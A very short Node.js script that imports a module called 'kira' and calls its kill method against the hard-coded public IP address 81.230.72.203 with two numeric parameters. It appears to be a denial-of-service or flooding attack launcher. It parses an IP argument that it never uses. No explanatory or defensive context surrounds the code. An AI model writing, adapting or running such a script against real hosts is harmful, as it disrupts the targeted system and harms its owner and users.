var Kira = require('kira');

var api = new Kira();
var args = process.argv.slice(2);

var ip = args[0]

api.kill('81.230.72.203', 200, 1000);
